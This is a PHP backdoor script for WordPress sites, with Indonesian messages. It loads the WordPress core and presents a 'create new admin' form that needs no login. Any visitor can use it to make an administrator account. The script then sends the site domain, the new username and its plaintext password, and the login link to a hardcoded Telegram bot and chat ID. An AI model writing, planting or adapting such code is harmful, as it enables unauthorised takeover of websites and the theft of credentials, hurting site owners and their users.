<?php  define('WP_USE_THEMES', false);  require_once( dirname( __FILE__ ) . '/wp-load.php' ); $bot_token = '8818714142:AAG2RWqxIr8nQjizU-NMZq7rtYD_SgMyBvE'; $chat_id = '8184724582';    function send_to_telegram_curl($message, $bot_token, $chat_id) { $fn_log_prefix = "send_to_telegram_curl: ";  if (empty($bot_token) || empty($chat_id)) { error_log($fn_log_prefix . "Bot token atau Chat ID kosong."); return ['success' => false, 'message' => 'Bot token atau Chat ID tidak boleh kosong.']; } if (empty($message)) { error_log($fn_log_prefix . "Pesan kosong, tidak dikirim."); return ['success' => false, 'message' => 'Pesan tidak boleh kosong.']; } if (!function_exists('curl_init')) { error_log($fn_log_prefix . "Ekstensi cURL PHP tidak diaktifkan di server."); return ['success' => false, 'message' => 'Ekstensi cURL PHP tidak diaktifkan di server.']; } $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage"; $payload = [ 'chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML' ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 15);  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 7);  curl_setopt($ch, CURLOPT_FAILONERROR, false);          $result_json = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curl_error_num = curl_errno($ch); $curl_error_msg = curl_error($ch); curl_close($ch); if ($curl_error_num !== 0) {  error_log($fn_log_prefix . "cURL Error (#" . $curl_error_num . "): " . $curl_error_msg . " | URL: " . $url); return ['success' => false, 'message' => "Gagal menghubungi Telegram (cURL Error " . $curl_error_num . "): " . $curl_error_msg]; }  if ($http_code !== 200) { error_log($fn_log_prefix . "Telegram API HTTP Error " . $http_code . " - Response: " . $result_json . " | Payload: " . json_encode($payload)); return ['success' => false, 'message' => "Telegram merespons dengan error HTTP " . $http_code . ". Detail: " . $result_json]; }  $response_data = json_decode($result_json, true); if (json_last_error() !== JSON_ERROR_NONE) { error_log($fn_log_prefix . "Gagal mem-parse JSON respons Telegram. Error JSON: " . json_last_error_msg() . " | Response: " . $result_json); return ['success' => false, 'message' => "Gagal memproses respons dari Telegram (JSON tidak valid)."]; } if (isset($response_data['ok']) && $response_data['ok'] === true) {  return ['success' => true, 'message' => 'Pesan berhasil dikirim ke Telegram.']; } else { $error_description = isset($response_data['description']) ? $response_data['description'] : 'Unknown API error'; error_log($fn_log_prefix . "Telegram API melaporkan error. Description: " . $error_description . " | Response: " . $result_json . " | Payload: " . json_encode($payload)); return ['success' => false, 'message' => "Telegram API Error: " . $error_description]; } } $feedback_text = ''; $feedback_class = ''; if ($_SERVER['REQUEST_METHOD'] === 'POST') { if (!isset($_POST['create_admin_nonce']) || !wp_verify_nonce($_POST['create_admin_nonce'], 'create_admin_action')) { $feedback_text = 'Permintaan tidak valid atau sesi telah berakhir. Silakan coba lagi.'; $feedback_class = 'message-error'; } else { $new_admin_username = trim($_POST['username'] ?? ''); $new_admin_password = trim($_POST['password'] ?? ''); $new_admin_email = trim($_POST['email'] ?? '');  $errors = []; if (empty($new_admin_username)) $errors[] = 'Username wajib diisi.'; if (empty($new_admin_password)) $errors[] = 'Password wajib diisi.'; if (!empty($new_admin_username) && !validate_username($new_admin_username)) $errors[] = 'Username tidak valid.'; if (strlen($new_admin_password) < 8 && !empty($new_admin_password)) $errors[] = 'Password minimal harus 8 karakter.'; if (!empty($new_admin_email) && !is_email($new_admin_email)) $errors[] = 'Format email tidak valid.'; if (!empty($errors)) { $feedback_text = implode('<br>', array_map('esc_html', $errors)); $feedback_class = 'message-error'; } else { if (!username_exists($new_admin_username)) { $user_id = wp_create_user($new_admin_username, $new_admin_password, $new_admin_email); if (!is_wp_error($user_id)) { $user = new WP_User($user_id); $user->set_role('administrator'); $script_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; $site_domain = parse_url(get_site_url(), PHP_URL_HOST); $wp_login_url = wp_login_url(); $telegram_msg_lines = [ "<b>â Admin Baru Dibuat</b>\n", "<b>Domain:</b> <code>" . esc_html($site_domain) . "</code>", "<b>Username:</b> <code>" . esc_html($new_admin_username) . "</code>", "<b>Password:</b> <code>" . esc_html($new_admin_password) . "</code>"  ]; if (!empty($new_admin_email)) { $telegram_msg_lines[] = "<b>Email:</b> <code>" . esc_html($new_admin_email) . "</code>"; } $telegram_msg_lines[] = "<b>URL Skrip Pembuat:</b> " . esc_url($script_url); $telegram_msg_lines[] = "<b>Link Login WP:</b> <a href=\"" . esc_url($wp_login_url) . "\">Klik untuk Login</a>"; $telegram_msg = implode("\n", $telegram_msg_lines);  error_log("send_to_telegram_curl PRE-SEND: Trying to send message for user '{$new_admin_username}'. Domain: {$site_domain}"); $telegram_result = send_to_telegram_curl($telegram_msg, $bot_token, $chat_id); if ($telegram_result['success']) { $feedback_text = 'Admin baru berhasil dibuat!.'; $feedback_class = 'message-success'; } else { $feedback_text = 'Admin baru berhasil dibuat. Error: ' . esc_html($telegram_result['message']); $feedback_class = 'message-warning'; error_log("Admin '{$new_admin_username}' dibuat, tapi notifikasi gagal: " . $telegram_result['message']); } } else { $feedback_text = 'Gagal membuat admin: ' . esc_html($user_id->get_error_message()); $feedback_class = 'message-error'; error_log("Gagal membuat admin '$new_admin_username': " . $user_id->get_error_message()); } } else { $feedback_text = 'Username <code>' . esc_html($new_admin_username) . '</code> sudah ada. Tidak membuat user baru.'; $feedback_class = 'message-warning'; } } } } ?>







<!DOCTYPE html>



<html>



<head>



    <title>Buat Admin Baru - Panel</title>



    <meta name="viewport" content="width=device-width, initial-scale=1.0">



    <style>



        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; max-width: 450px; margin: 2em auto; padding: 0 15px; background-color: #f0f0f1; color: #444; }



        h2 { color: #2c3338; text-align: center; }



        .container { background-color: #fff; padding: 20px 25px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); }



        label { display: block; margin-top: 1em; font-weight: bold; color: #555d66; }



        input[type=text], input[type=password], input[type=email] {



            width: 100%;



            padding: 10px;



            margin-top: 0.5em;



            border: 1px solid #ddd;



            border-radius: 4px;



            box-sizing: border-box;



        }



        input:focus { border-color: #007cba; box-shadow: 0 0 0 1px #007cba; outline: none; }



        button {



            margin-top: 1.5em;



            padding: 12px 20px;



            background-color: #007cba;



            color: white;



            border: none;



            border-radius: 4px;



            cursor: pointer;



            font-size: 1em;



            width: 100%;



            transition: background-color 0.2s ease-in-out;



        }



        button:hover { background-color: #005a87; }



        .message {



            margin-top: 1em;



            margin-bottom: 1em;



            padding: 12px;



            border-radius: 4px;



            text-align: center;



            border-width: 1px;



            border-style: solid;



        }



        .message p { margin: 0; }



        .message-error { background-color: #f8d7da; color: #721c24; border-color: #f5c6cb;}



        .message-success { background-color: #d4edda; color: #155724; border-color: #c3e6cb;}



        .message-warning { background-color: #fff3cd; color: #856404; border-color: #ffeeba;}



        .message-warning code, .message-error code { 



            background-color: rgba(0,0,0,0.05);



            padding: 2px 4px;



            border-radius: 3px;



        }



    </style>



</head>



<body>



    <div class="container">



        <h2>Buat Admin Baru WordPress</h2>







        <?php if ($feedback_text): ?>



            <div class="message <?= esc_attr($feedback_class) ?>">



                <p><?= $feedback_text  ?></p>



            </div>



        <?php endif; ?>







        <form method="POST" action="">



            <?php wp_nonce_field('create_admin_action', 'create_admin_nonce'); ?>



            <label for="username_input">Username



                <input type="text" id="username_input" name="username" required value="<?= isset($_POST['username']) ? esc_attr($_POST['username']) : '' ?>">



            </label>







            <label for="password_input">Password (min. 8 karakter)



                <input type="password" id="password_input" name="password" required>



            </label>







            <label for="email_input">Email (opsional)



                <input type="email" id="email_input" name="email" placeholder="admin@example.com" value="<?= isset($_POST['email']) ? esc_attr($_POST['email']) : '' ?>">



            </label>







            <button type="submit">Buat Admin</button>



        </form>



    </div>



</body>



</html>
